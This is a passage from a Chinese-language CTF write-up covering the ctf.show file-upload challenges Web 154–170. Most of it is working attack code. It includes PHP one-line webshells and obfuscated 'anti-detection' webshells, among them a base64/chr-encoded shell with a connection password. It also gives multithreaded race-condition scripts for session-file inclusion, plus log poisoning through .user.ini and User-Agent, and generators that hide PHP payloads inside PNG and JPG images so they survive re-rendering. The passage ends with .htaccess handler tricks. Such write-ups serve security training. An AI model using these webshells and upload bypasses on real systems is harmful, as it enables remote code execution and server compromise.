class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);</span><br><span class="line">自 PHP 5.4 起，短格式的 <span class="built_in">echo</span> 标记 &lt;?= 总会被识别并且合法，而不管 short_open_tag 的设置是什么。</span><br><span class="line">&lt;? <span class="built_in">echo</span> <span class="string">&#x27;123&#x27;</span>;?&gt; //short_open_tags=on</span><br><span class="line">&lt;?=(表达式)?&gt;  等价于 &lt;?php <span class="built_in">echo</span> (表达式)?&gt; //无限制</span><br><span class="line"></span><br><span class="line">3:ASP风格</span><br><span class="line">&lt;% @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]); %&gt;</span><br><span class="line">ASP风格标记仅在通过php.ini配置文件中的指令asp_tags打开后才可用。</span><br><span class="line">&lt;% <span class="built_in">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt; //asp_tags=on php_version &lt; 7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4:脚本风格</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;666&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">PHP 7.0.0以后失效</span><br></pre></td></tr></table></figure><p>本题发现可以大小写进行绕过</p><p><img src="https://i.loli.net/2021/10/01/OK2fCwJcnrYslM9.png" alt="image-20210720200023631"></p><p>蚁剑显示不出具体文件时，尝试进行终端查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 php，没过滤大小写</span></span><br></pre></td></tr></table></figure><h2 id="1-5-Web-155-—-短标签绕过-php"><a href="#1-5-Web-155-—-短标签绕过-php" class="headerlink" title="1.5 Web 155 — 短标签绕过 php"></a>1.5 Web 155 — 短标签绕过 php</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 php，过滤了大小写</span></span><br></pre></td></tr></table></figure><p>同上</p><p>可使用短标签绕过 php</p><h2 id="1-6-Web-156-—-代替"><a href="#1-6-Web-156-—-代替" class="headerlink" title="1.6 Web 156 — { } 代替 [ ]"></a>1.6 Web 156 — { } 代替 [ ]</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 php，大小写，[]符号</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/01/Nra5pRCybtQYUOP.png" alt="image-20210720202139179"></p><p><img src="https://i.loli.net/2021/10/01/wcz8kXj7r3ExJie.png" alt="image-20210720202229781"></p><p>之后同上</p><h2 id="1-7-Web-157-159-—-命令执行"><a href="#1-7-Web-157-159-—-命令执行" class="headerlink" title="1.7 Web 157-159 — 命令执行"></a>1.7 Web 157-159 — 命令执行</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 php，大小写，[]，&#123;&#125;，;</span></span><br></pre></td></tr></table></figure><p>转换思路，不上传一句话了，直接</p><p>命令执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;? system(<span class="string">&quot;nl ../f*&quot;</span>)?&gt;</span><br><span class="line">&lt;?=(system(<span class="string">&#x27;nl ../f*&#x27;</span>))?&gt;</span><br><span class="line">&lt;?= `nl ../*.p*`?&gt;</span><br><span class="line">&lt;?= `nl ../f*`?&gt;</span><br><span class="line">&lt;?=(system(<span class="string">&#x27;tac ../f*&#x27;</span>))?&gt;</span><br></pre></td></tr></table></figure><h2 id="1-8-Web-160-—-日志包含（过滤-log）"><a href="#1-8-Web-160-—-日志包含（过滤-log）" class="headerlink" title="1.8 Web 160 — 日志包含（过滤 log）"></a>1.8 Web 160 — 日志包含（过滤 log）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 php，大小写，[]，;，``，log</span></span><br></pre></td></tr></table></figure><p>日志包含</p><p>条件</p><ul><li>知道日志文件的路径</li><li>对日志文件可读</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传 .user.iniauto_prepend_file=123.png# 上传 123.png# nginx 服务器&lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;# 由于 log 被过滤，进行拼接&lt;?=include&quot;/var/l&quot;.&quot;og/nginx/access.l&quot;.&quot;og&quot;?&gt;</span></span><br></pre></td></tr></table></figure><p>将 .user.ini 和 123.png 都成功上传之后，访问 <code> /upload/index.php</code></p><p>抓包在 <code>User-Agent</code> 中添入代码，访问即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;cat ../flag.php&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/21/p6PutMZCSYgQdLr.png" alt="image-20210721124504715"></p><p><img src="https://i.loli.net/2021/07/21/O9SvKMbpocfR3q2.png" alt="image-20210721124531227"></p><p>流程</p><ul><li>访问 <code>/upload/index.php</code> 由于 <code>.user.ini</code> 的配置，将首先自动包含文件 <code>123.png</code> </li><li>由于是 <code>包含</code> 文件 <code>123.png</code> ，将会自动执行其中的代码</li><li>即包含 <code>/var/log/nginx/access.log</code> 日志文件</li><li>而我们再在日志文件当中写入 恶意代码，就将会被执行</li></ul><h2 id="1-9-Web-161-—-文件头-GIF89a-写入"><a href="#1-9-Web-161-—-文件头-GIF89a-写入" class="headerlink" title="1.9 Web 161 — 文件头 GIF89a 写入"></a>1.9 Web 161 — 文件头 GIF89a 写入</h2><p>无法上传 <code>.user.ini</code></p><p>验证了图片内容，即必须包含文件头</p><p>在 Web 160 的基础上添加 文件头 <code>GIF89a</code> 或者是 PNG 图片的 <code>文件幻术</code></p><p><img src="https://i.loli.net/2021/07/21/Ya75OIkosdrSbRE.png" alt="image-20210721125558136"></p><p><img src="https://i.loli.net/2021/07/21/qGbXiNZ7uD8A2Pe.png" alt="image-20210721125856813"></p><p><img src="https://i.loli.net/2021/07/21/wOsKQkMEYRUujnW.png" alt="image-20210721130106975"></p><h2 id="1-10-Web-162-163-—-session-文件包含"><a href="#1-10-Web-162-163-—-session-文件包含" class="headerlink" title="1.10 Web 162-163 — session 文件包含"></a>1.10 Web 162-163 — session 文件包含</h2><p>继续使用上述 日志 包含，发现上传 <code>.user.ini</code> 时，文件内容 过滤掉了 <code>.</code></p><p>过滤掉了 <code>.</code>  session 包含</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传 .user.iniGIF89aauto_prepend_file=test</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传 testGIF89a&lt;?=include&quot;/tmp/sess_test&quot;?&gt;</span></span><br></pre></td></tr></table></figure><p>构造 POST 数据包</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://e2f78cd5-b2b8-40b9-8104-7dc18214350b.challenge.ctf.show:8080/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span>    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span>    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span>    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>任意上传一个文件，抓包修改，写入代码，进行爆破</p><p><img src="https://i.loli.net/2021/07/21/HmES6KB97UnDcgF.png" alt="image-20210721151414901"></p><p>然后访问 <code>/upload/index.php</code> 页面进行抓包，爆破</p><p><img src="https://i.loli.net/2021/07/21/uSMpcJGzZD91brq.png" alt="image-20210721151707750"></p><p>以上两个包同时进行爆破，得到 flag</p><p><img src="https://i.loli.net/2021/07/21/rKuN4IBLwt9eXkZ.png" alt="image-20210721151742123"></p><p>流程</p><ul><li><p>上传 <code>.user.ini</code></p></li><li><p>上传 <code>test</code> </p></li><li><p>访问 <code>/upload/index.php</code> ，由于 <code>.user.ini</code> 的配置，首先包含 <code>test</code> 文件，紧接着执行其中代码，即包含 <code>/tmp/sess_test</code></p></li><li><p>包含 <code>sess_test</code> ，即执行其中的 php 代码，即显示出 flag.php</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 脚本# coding=utf-8import ioimport requestsimport threadingsessID = &#x27;test&#x27;url = &#x27;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/&#x27;def write(session):    while event.isSet():        f = io.BytesIO(b&#x27;a&#x27; * 256 * 1)        response = session.post(            url,            cookies=&#123;&#x27;PHPSESSID&#x27;: sessID&#125;,            data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php system(&quot;nl ../*.php&quot;);?&gt;&#x27;&#125;,            files=&#123;&#x27;file&#x27;: (&#x27;test.txt&#x27;, f)&#125;        )def read(session):    while event.isSet():        response = session.get(url + &#x27;upload/index.php&#x27;.format(sessID))        if &#x27;flag&#x27; in response.text:            print(response.text)            event.clear()        else:            print(&#x27;[*]retrying...&#x27;)if __name__ == &#x27;__main__&#x27;:    event = threading.Event()    event.set()    with requests.session() as session:        for i in range(1, 30):            threading.Thread(target=write, args=(session,)).start()        for i in range(1, 30):            threading.Thread(target=read, args=(session,)).start()</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 条件竞争# coding=utf-8import requestsimport threadingsession=requests.session()sess=&#x27;test&#x27;url1=&quot;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/&quot;url2=&quot;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/upload&quot;data1=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;&#125;file=&#123;&#x27;file&#x27;:&#x27;test&#x27;&#125;cookies=&#123;&#x27;PHPSESSID&#x27;: sess&#125;def write():while True:r = session.post(url1,data=data1,files=file,cookies=cookies)def read():while True:r = session.get(url2)if &#x27;flag&#x27; in r.text:print(r.text)threads = [threading.Thread(target=write),       threading.Thread(target=read)]for t in threads:t.start()</span></span><br></pre></td></tr></table></figure><h2 id="1-11-Web-164-—-png-二次渲染"><a href="#1-11-Web-164-—-png-二次渲染" class="headerlink" title="1.11 Web 164 — png 二次渲染"></a>1.11 Web 164 — png 二次渲染</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$p</span> = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33);<span class="variable">$img</span> = imagecreatetruecolor(32, 32);<span class="keyword">for</span> (<span class="variable">$y</span> = 0; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += 3) &#123;   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+1];   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+2];   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / 3), 0, <span class="variable">$color</span>);&#125;imagepng(<span class="variable">$img</span>,<span class="string">&#x27;1.png&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure><p>结果生成 <code>1.png</code> ，其中包含 <code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code></p><p><img src="https://i.loli.net/2021/07/21/SKMrgRq4snXW91T.png" alt="image-20210721160555057"></p><p>然后访问图片，执行代码后，下载图片查看</p><p><img src="https://i.loli.net/2021/07/21/lzoC5PLZSHkDWGF.png" alt="image-20210721161031568"></p><p>因为在下载的时候，看到 url 是 <code>download/?image=</code> ，可能是文件包含，所以可以执行我们的命令</p><h2 id="1-12-Web-165-—-jpg-二次渲染"><a href="#1-12-Web-165-—-jpg-二次渲染" class="headerlink" title="1.12 Web 165 — jpg 二次渲染"></a>1.12 Web 165 — jpg 二次渲染</h2><ul><li><p>首先准备一张 jpg 图片上传，成功后下载回来，使用如下脚本处理，生成一个新的图片马，再次上传</p></li><li><p>查看，即文件包含，保存到本地打开即可</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=`tac f*`?&gt;&quot;</span>;<span class="comment">//这里改代码    if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123;        die(&#x27;php-gd is not installed&#x27;);    &#125;    if(!isset($argv[1])) &#123;        die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);    &#125;    set_error_handler(&quot;custom_error_handler&quot;);    for($pad = 0; $pad &lt; 1024; $pad++) &#123;        $nullbytePayloadSize = $pad;        $dis = new DataInputStream($argv[1]);        $outStream = file_get_contents($argv[1]);        $extraBytes = 0;        $correctImage = TRUE;        if($dis-&gt;readShort() != 0xFFD8) &#123;            die(&#x27;Incorrect SOI marker&#x27;);        &#125;        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;            $marker = $dis-&gt;readByte();            $size = $dis-&gt;readShort() - 2;            $dis-&gt;skip($size);            if($marker === 0xDA) &#123;                $startPos = $dis-&gt;seek();                $outStreamTmp =                     substr($outStream, 0, $startPos) .                     $miniPayload .                     str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .                     substr($outStream, $startPos);                checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE);                if($extraBytes !== 0) &#123;                    while((!$dis-&gt;eof())) &#123;                        if($dis-&gt;readByte() === 0xFF) &#123;                            if($dis-&gt;readByte !== 0x00) &#123;                                break;                            &#125;                        &#125;                    &#125;                    $stopPos = $dis-&gt;seek() - 2;                    $imageStreamSize = $stopPos - $startPos;                    $outStream =                         substr($outStream, 0, $startPos) .                         $miniPayload .                         substr(                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).                                substr($outStream, $startPos, $imageStreamSize),                            0,                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                                 substr($outStream, $stopPos);                &#125; elseif($correctImage) &#123;                    $outStream = $outStreamTmp;                &#125; else &#123;                    break;                &#125;                if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123;                    die(&#x27;Success!&#x27;);                &#125; else &#123;                    break;                &#125;            &#125;        &#125;    &#125;    unlink(&#x27;payload_&#x27;.$argv[1]);    die(&#x27;Something\&#x27;s wrong&#x27;);    function checkImage($filename, $data, $unlink = FALSE) &#123;        global $correctImage;        file_put_contents($filename, $data);        $correctImage = TRUE;        imagecreatefromjpeg($filename);        if($unlink)            unlink($filename);        return $correctImage;    &#125;    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;        global $extraBytes, $correctImage;        $correctImage = FALSE;        if(preg_match(&#x27;/(\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123;            if(isset($m[1])) &#123;                $extraBytes = (int)$m[1];            &#125;        &#125;    &#125;    class DataInputStream &#123;        private $binData;        private $order;        private $size;        public function __construct($filename, $order = false, $fromString = false) &#123;            $this-&gt;binData = &#x27;&#x27;;            $this-&gt;order = $order;            if(!$fromString) &#123;                if(!file_exists($filename) || !is_file($filename))                    die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;);                $this-&gt;binData = file_get_contents($filename);            &#125; else &#123;                $this-&gt;binData = $filename;            &#125;            $this-&gt;size = strlen($this-&gt;binData);        &#125;        public function seek() &#123;            return ($this-&gt;size - strlen($this-&gt;binData));        &#125;        public function skip($skip) &#123;            $this-&gt;binData = substr($this-&gt;binData, $skip);        &#125;        public function readByte() &#123;            if($this-&gt;eof()) &#123;                die(&#x27;End Of File&#x27;);            &#125;            $byte = substr($this-&gt;binData, 0, 1);            $this-&gt;binData = substr($this-&gt;binData, 1);            return ord($byte);        &#125;        public function readShort() &#123;            if(strlen($this-&gt;binData) &lt; 2) &#123;                die(&#x27;End Of File&#x27;);            &#125;            $short = substr($this-&gt;binData, 0, 2);            $this-&gt;binData = substr($this-&gt;binData, 2);            if($this-&gt;order) &#123;                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);            &#125; else &#123;                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);            &#125;            return $short;        &#125;        public function eof() &#123;            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);        &#125;    &#125;//使用方法 php exp.php 1.jpg<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/21/ScR1qu6KTMr2sVQ.png" alt="image-20210721162813731"></p><h2 id="1-13-Web-166-—-zip-文件上传"><a href="#1-13-Web-166-—-zip-文件上传" class="headerlink" title="1.13 Web 166 — zip 文件上传"></a>1.13 Web 166 — zip 文件上传</h2><p><img src="https://i.loli.net/2021/07/21/9TkxK1odzty2Nv3.png" alt="image-20210721164403808"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Content-Type: application/x-zip-compressed</span></span><br></pre></td></tr></table></figure><p>将一句话木马后缀更改为 <code>zip</code> 上传即可，查看文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/upload/download.php?file=9643f09dfc5004a1dc73f4c025f084d2.zip</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/21/byWHDYP5SwFzrva.png" alt="image-20210721165703094"></p><p>将代码更改即可</p><h2 id="1-14-Web-167-—-htaccess"><a href="#1-14-Web-167-—-htaccess" class="headerlink" title="1.14 Web 167 —  .htaccess"></a>1.14 Web 167 —  .htaccess</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd</span><br></pre></td></tr></table></figure><p>尝试 jpg 文件成功上传之后发现服务器是 <code>Apache </code>，再根据提示，尝试上传 <code>.htaccess</code></p><p><img src="https://i.loli.net/2021/07/21/DSlwZg8LF4zHdat.png" alt="image-20210721170008372"></p><p><img src="https://i.loli.net/2021/07/21/BcLmbKfsRQgp2j7.png" alt="image-20210721170131053"></p><p>成功上传</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传 111.png&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;</span></span><br></pre></td></tr></table></figure><p>之后访问 <code>/upload/111.png</code> </p><p>蚁剑连接即可</p><h2 id="1-15-Web-168-—-免杀代码"><a href="#1-15-Web-168-—-免杀代码" class="headerlink" title="1.15 Web 168 — 免杀代码"></a>1.15 Web 168 — 免杀代码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">基础免杀<span class="comment"># 过滤了 eval , system , $_POST , $_GET 等</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/21/JC5EVDoc8fWKMmG.png" alt="image-20210721170727602"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可使用反引号&lt;?=`ls /var/www/html`?&gt;#flag.php flagaa.php images index.php js layui upload upload.php &lt;?=`cat /var/www/html/flagaa.php`?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 其它绕过方式</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php // 使用时请删除此行, 连接密码: TyKPuntU ?&gt;&lt;?php <span class="variable">$bFIY</span>=create_function(chr(25380/705).chr(92115/801).base64_decode(<span class="string">&#x27;bw==&#x27;</span>).base64_decode(<span class="string">&#x27;bQ==&#x27;</span>).base64_decode(<span class="string">&#x27;ZQ==&#x27;</span>),chr(0x16964/0x394).chr(0x6f16/0xf1).base64_decode(<span class="string">&#x27;YQ==&#x27;</span>).base64_decode(<span class="string">&#x27;bA==&#x27;</span>).chr(060340/01154).chr(01041-0775).base64_decode(<span class="string">&#x27;cw==&#x27;</span>).str_rot13(<span class="string">&#x27;b&#x27;</span>).chr(01504-01327).base64_decode(<span class="string">&#x27;ZQ==&#x27;</span>).chr(057176/01116).chr(0xe3b4/0x3dc));<span class="variable">$bFIY</span>(base64_decode(<span class="string">&#x27;NjgxO&#x27;</span>.<span class="string">&#x27;Tc7QG&#x27;</span>.<span class="string">&#x27;V2QWw&#x27;</span>.<span class="string">&#x27;oJF9Q&#x27;</span>.<span class="string">&#x27;&#x27;</span>.str_rot13(<span class="string">&#x27;G&#x27;</span>).str_rot13(<span class="string">&#x27;1&#x27;</span>).str_rot13(<span class="string">&#x27;A&#x27;</span>).base64_decode(<span class="string">&#x27;VQ==&#x27;</span>).str_rot13(<span class="string">&#x27;J&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;&#x27;</span>.chr(0x304-0x2d3).base64_decode(<span class="string">&#x27;Ug==&#x27;</span>).chr(13197/249).str_rot13(<span class="string">&#x27;F&#x27;</span>).base64_decode(<span class="string">&#x27;MQ==&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;B1bnR&#x27;</span>.<span class="string">&#x27;VXSk7&#x27;</span>.<span class="string">&#x27;MjA0N&#x27;</span>.<span class="string">&#x27;TkxOw&#x27;</span>.<span class="string">&#x27;==&#x27;</span>.<span class="string">&#x27;&#x27;</span>));?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;<span class="variable">$b</span> = explode(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);<span class="variable">$c</span> = <span class="variable">$b</span>[0].<span class="variable">$b</span>[1].<span class="variable">$b</span>[2].<span class="variable">$b</span>[3].<span class="variable">$b</span>[4].<span class="variable">$b</span>[5];<span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[1]);?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=substr(<span class="string">&#x27;1s&#x27;</span>,1).<span class="string">&#x27;ystem&#x27;</span>;<span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[1]);?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=strrev(<span class="string">&#x27;metsys&#x27;</span>);<span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[1]);?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];<span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];<span class="variable">$a</span>(<span class="variable">$b</span>);?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`<span class="variable">$_REQUEST</span>[1]`;?&gt;<span class="comment"># 利用反引号执行系统命令</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;(<span class="variable">$a</span>)(<span class="string">&#x27;ls ../&#x27;</span>);<span class="comment"># 拼接</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$pi</span>=base_convert(37907361743,10,36)(dechex(1598506324));($<span class="variable">$pi</span>&#123;abs&#125;)($<span class="variable">$pi</span>&#123;acos&#125;);<span class="comment"># get传参   abs=system&amp;acos=ls# 数学函数</span></span><br></pre></td></tr></table></figure><h2 id="1-16-Web-169-170-—-日志包含（未过滤-log）"><a href="#1-16-Web-169-170-—-日志包含（未过滤-log）" class="headerlink" title="1.16 Web 169-170 — 日志包含（未过滤 log）"></a>1.16 Web 169-170 — 日志包含（未过滤 log）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">高级免杀</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前端做了 .zip 检查# 后端做了 Content-Type 检查</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/23/aQOvN7gYmnkrzJI.png" alt="image-20210723121849471"></p><p><img src="https://i.loli.net/2021/07/23/Tl6QwvReabhIYEK.png" alt="image-20210723122033455"></p><p>访问 <code>1.php</code> ，我们必须自己上传一个 <code>.php</code> 文件</p><p><img src="https://i.loli.net/2021/07/23/FpgVTBIsjbMiE7P.png" alt="image-20210723122136445"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&#x27;ls ../&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/23/m7yc4khwYu9qO6t.png" alt="image-20210723122412864"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&#x27;cat ../flagaa.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h1 id="二、总结"><a href="#二、总结" class="headerlink" title="二、总结"></a>二、总结</h1><ol><li><p>找到允许上传的文件类型，抓包</p></li><li><p>在 Content-Type 正确的情况下，首先尝试直接更改 后缀为 .php ，写入一句话木马</p></li><li><p>上述不允许的情况下，观察服务器类型，nginx 尝试 .user.ini ，Apache 尝试 .htaccess</p><ul><li>```bash<h1 id="user-iniauto-prepend-file-1-pngauto-prepend-file-testauto-prepend-file-var-log-nginx-access-log"><a href="#user-iniauto-prepend-file-1-pngauto-prepend-file-testauto-prepend-file-var-log-nginx-access-log" class="headerlink" title=".user.iniauto_prepend_file=1.pngauto_prepend_file=testauto_prepend_file=/var/log/nginx/access.log"></a>.user.iniauto_prepend_file=1.pngauto_prepend_file=testauto_prepend_file=/var/log/nginx/access.log</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ ```bash</span><br><span class="line">  # .htaccessAddType application/x-httpd-php .png# 特定文件后缀当作 php 文件处理AddHandler php5-script php # 包含关键字的文件名当作 php 文件处理&lt;FilesMatch &quot;文件名&quot;&gt;# 特定文件名当作 php 文件处理SetHandler 